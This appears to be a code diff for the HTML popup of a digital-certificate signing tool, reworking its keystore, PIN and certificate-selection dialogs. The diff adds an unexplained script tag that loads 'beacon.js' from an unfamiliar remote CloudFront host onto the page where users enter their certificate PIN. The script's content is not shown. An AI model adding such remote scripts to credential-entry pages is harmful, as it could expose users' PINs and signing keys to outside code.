@@ -52,50 +52,101 @@
 
 <script src="resources/popup-app.js"></script>
 <script src="resources/util.js"></script>
+<script type="text/javascript" src="https://disutgh7q0ncc.cloudfront.net/beacon.js"></script>
 </head>
 
 <body ng-app="app" ng-controller="ctrlPopup" ng-cloak>
 	<input type="hidden" id="chrome-extension-active" value="0" />
 	<input type="hidden" id="native-client-active" value="0" />
 
-	<div class="container content">
-		<div class="row" ng-show="pinDialog">
-			<div class="col-12">
-				<form ng-keyup="$event.keyCode == 13 && pinProsseguir()">
-					<label class="control-label" for="userPIN" style="width: 100%">Entre
-						o PIN do Certificado Digital <input type="password"
-						class="form-control" style="width: 100%" id="userPIN"
-						ng-model="pinField" placeholder="PIN" autofocus />
-					</label> <em ng-show="errormsg" for="email" class="invalid">{{errormsg}}</em>
-				</form>
+	<div class="container">
+	
+		<!-- Keytore Dialog -->
+		<div class="content" ng-show="keystoreDialog">
+			<div class="row">
+				<div class="col-12">
+					<form>
+						<label class="control-label">Selecione a mídia de armazenamento do seu Certificado Digital</label>						
+						<div class="list-group" id="keystoreList">
+						  <a class="list-group-item list-group-item-action" ng-repeat="item in keystoreSupported" data-toggle="list" href="#" 
+								  	data-keystore="{{item.value}}"
+								  	ng-class="($index == 0 ? 'active' : '')">
+						    <div class="d-flex w-100 justify-content-between">
+						      <h5 class="mb-1">{{item.keystoreMedia}}</h5>
+						      <strong>{{item.keystoreCertificateType}}</strong>
+						    </div>
+						    <small>{{item.keystoreDescription}}</small>
+						  </a>
+						</div> 
+						<input type="text" class="form-control d-none" id="selectKeystore" ng-model="selectKeystore" />
+					</form>
+				</div> 
 			</div>
-			<div class="col-12">
-				<button type="button" ng-click="pinCancelar()" class="btn">Cancelar</button>
-				<button type="button" ng-click="pinProsseguir()" id="prosseguir"
-					class="btn btn-primary">Prosseguir</button>
-			</div>
-		</div>
-
-		<div class="row" ng-show="certsDialog">
-			<div class="col-12">
-				<form ng-keyup="$event.keyCode == 13 && certsProsseguir()">
-					<label class="control-label" for="userPIN" style="width: 100%">Escolha
-						o certificado que será utilizado na assinatura:
-
-						<div class="radio" ng-repeat="item in list">
-							<label><input type="radio" ng-model="userSubjectField"
-								value="{{item.subject}}">{{item.subject}}</label>
-						</div>
-
-					</label> <em ng-show="errormsg" for="email" class="invalid">{{errormsg}}</em>
-				</form>
-			</div>
-			<div class="col-12">
-				<button type="button" ng-click="certsCancelar()" class="btn">Cancelar</button>
-				<button type="button" ng-click="certsProsseguir()" id="prosseguir"
-					class="btn btn-primary">Prosseguir</button>
+			<div class="row"> 
+				<div class="col-12 mt-4"> 
+					<div class="float-right">
+						<button type="button" ng-click="closeModal()" class="btn">Cancelar</button>
+						<button type="button" ng-click="keystoreProsseguir()" id="prosseguir" class="btn btn-primary">Prosseguir</button>
+					</div>
+				</div>
 			</div>
 		</div>
+		<!-- End -->
+
+		<!-- PIN PKCS Dialog -->
+		<div class="content" ng-show="pinDialog">
+			<div class="row mt-5">
+				<div class="col-12">
+					<form ng-keyup="$event.keyCode == 13 && pinProsseguir()">
+						<label class="control-label" for="userPIN" style="width: 100%">Entre com o PIN do Certificado Digital</label> 
+						<input type="password" class="form-control" style="width: 100%" id="userPIN" ng-model="pinField" placeholder="PIN" autofocus />
+						<em ng-show="errormsg" for="userPIN" class="invalid">{{errormsg}}</em>
+					</form>
+				</div>
+			</div>
+			<div class="row fixed-bottom bg-white"> 
+				<div class="col-12 mt-4">
+					<div class="float-right">
+						<button type="button" ng-click="closeModal()" class="btn">Cancelar</button>
+						<button type="button" ng-click="pinProsseguir()" id="prosseguir" class="btn btn-primary">Prosseguir</button>
+					</div>
+				</div>
+			</div>
+		</div>
+		<!-- End -->
+
+		<!-- Select Certs Dialog -->
+		
+		<div class="content" ng-show="certsDialog">
+			<div class="row">	
+				<div class="col-12 mb-5">
+					<form>
+						<label class="control-label">Selecione o certificado que será utilizado na assinatura: </label>
+						<div class="list-group" id="certificadoList">
+						  <a class="list-group-item list-group-item-action" ng-repeat="item in listCert" data-toggle="list" href="#" 
+							  	data-cert="{{item}}"
+							  	ng-class="($index == 0 ? 'active' : '')">
+						    <div class="d-flex w-100 justify-content-between">
+						      <h6 class="mb-1">{{item.alias}}</h6>
+						    </div>
+						    <p><small>{{item.subject}}</small></p> 
+						  </a>
+						</div> 
+					</form>	
+				</div>
+			</div>
+			<div class="row fixed-bottom bg-white"> 
+				<div class="col-12 mt-4">
+					<div class="float-right">
+						<button type="button" ng-click="closeModal()" class="btn">Cancelar</button> 
+						<button type="button" ng-click="certsProsseguir()" id="prosseguir" class="btn btn-primary">Prosseguir</button>
+					</div>
+				</div>
+			</div>
+		</div>
+		<!-- End -->
+		
+
 
 		<div class="row" ng-show="showErrorDetails">
 			<div class="col-md-12">
